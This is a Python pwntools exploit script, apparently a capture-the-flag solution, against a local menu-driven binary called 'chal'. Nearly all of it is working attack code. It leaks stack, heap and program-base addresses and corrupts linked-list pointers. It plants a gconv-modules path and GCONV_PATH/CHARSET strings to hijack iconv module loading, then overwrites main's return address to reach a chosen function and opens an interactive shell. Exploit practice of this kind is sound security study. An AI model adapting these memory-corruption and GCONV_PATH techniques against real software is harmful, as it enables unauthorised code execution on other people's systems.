#!pip3 install pwntools 


from pwn import *

s = process("./chal")

def add(p1, p2, p3, p4, notes):
	s.sendlineafter(b"DONE\n", b"1")
	s.sendlineafter(b"bread: ", p1)
	s.sendlineafter(b"spread: ", p2)
	s.sendlineafter(b"veg: ", p3)
	s.sendlineafter(b"egg: ", p4)
	s.sendlineafter(b"cook? ", notes)

def edit(idx, p1, p2, p3, p4, notes):
	s.sendlineafter(b"DONE\n", b"2")
	s.sendlineafter(b"index: ", str(idx))
	s.sendlineafter(b"bread: ", p1)
	s.sendlineafter(b"spread: ", p2)
	s.sendlineafter(b"veg: ", p3)
	s.sendlineafter(b"egg: ", p4)
	s.sendlineafter(b"cook? ", notes)

def show(idx):
	s.sendlineafter(b"DONE\n", b"3")
	s.sendlineafter(b"index: ", str(idx))
	return s.recvline()

def cancel(idx):
	s.sendlineafter(b"DONE\n", b"4")
	s.sendlineafter(b"index: ", str(idx))

s.sendline("1")
s.sendline("recipe")
s.recvuntil(b"Order number: ")
stack_leak = s.recvline().strip(b"\n")
stack_leak = int(stack_leak, 16)
log.info("Stack leak: {}".format(hex(stack_leak)))


add("0", "0", "0", "aaaa", "module UTF-8// SHELLY// shelly 2")
add("1", "1", "1", "b"*8, "BBBB")
add("2", "2", "2", "cccc", "CCCC")
add("3", "3", "3", "dddd", "DDDD")
#edit(0, "0", "0", "0", "a"*16 + "\xf0", "AAAA")
leak = show(1)
leak = leak.split(b", ")
leak = leak[3][8:]
leak = u64(leak.ljust(8, b"\x00"))
log.info("Leaked chunk: {}".format(hex(leak)))
heap = leak - 0x7e0
log.info("Heap Base: {}".format(hex(heap)))

edit(1, p64(stack_leak), "1", "1", "b"*8 + chr(0x68), "BBBB")

recipe_leak = show(2)
recipe_leak = recipe_leak.split(b", ")[4].strip(b"\n")
recipe_leak = u64(recipe_leak.ljust(8, b"\x00"))
log.info("Leaked \"/recipe\" address: {}".format(hex(recipe_leak)))
base = recipe_leak - 0x5020
log.info("Base: {}".format(hex(base)))

# set nxt pointer to point to "/notes"
# chunk 2 is now at chunk 1 + 0x8
edit(1, p64(recipe_leak - 0x10), "1", "1", "b"*8 + chr(0x68), "module UTF-8// SHELLY// shelly 2")
# confirm that recipe_leak - 0x10 is /notes
print(show(2))
# set nxt pointer of chunk 1 to NULL, then write "/gconv-modules" to /notes
edit(2, "2", "2", "2", p64(0x0), "/gconv-modules")

# execute order 
s.sendline("5")
# return to 1st menu
s.sendline("6")

s.sendline("1")
s.sendline("GCONV_PATH=.")
s.recvuntil(b"Order number: ")
stack_leak = s.recvline().strip(b"\n")
stack_leak = int(stack_leak, 16)
log.info("Stack leak: {}".format(hex(stack_leak)))


add("0", "0", "0", "aaaa", "recipe")
add("1", "1", "1", "bbbb", "PATH=GCONV_PATH=.")
add("2", "2", "2", "cccc", "CHARSET=SHELLY")
add("3", "3", "3", "dddd", "SHELL=shelly")
add("4", "4", "4", "eeee", "\x00")
add("5", "5", "5", "ffff", "\x00")
add("6", "6", "6", "g"*8, "\x00")
add("7", "7", "7", "hhhh", "\x00")
add("8", "8", "8", "iiii", "\x00")

leak = show(6)
leak = leak.split(b", ")
leak = leak[3][8:]
leak = u64(leak.ljust(8, b"\x00"))
log.info("Leaked chunk: {}".format(hex(leak)))
# will get back an address that ends with 0x80, which is the 7th chunk. But we want our chunk to start at `start of 6th chunk + 0x8` 
#0x...78 is offset to `start of 6th chunk + 8`
#=> 0x80 - 0x78 = 0x8 is the byte that we will overflow to the nxt ptr of the 6th chunk

"""
Dunno why I did this at first, but this is unnecessary. 

# notes for this chunk is now the 4th (0-indexed) entry in the pointer array in cart. 
#edit(6, p64(base + 0x5170), "1", "1", "g"*8 + chr(0x8), p64(0x0))

# now write the NULL ptr there, also keep the nxt ptr of the 6th chunk the same (point to `start of 6th chunk + 8`) for the next stage in the exploit
#edit(7, "7", "7", "7", p64(leak - 0x78), p64(0x0))
"""
# now reset the state to before the previous statement, but this time, notes for this chunk is the RIP of main.
edit(6, p64(stack_leak + 0x18), "1", "1", "g"*8 + chr(0x8), p64(0x0))

# overwrite main's return address to f()
edit(7, "7", "7", "7", p64(0x0), p64(base + 0x1e84))

s.sendline("5")
s.sendline("6")
s.sendline("2")
s.interactive()







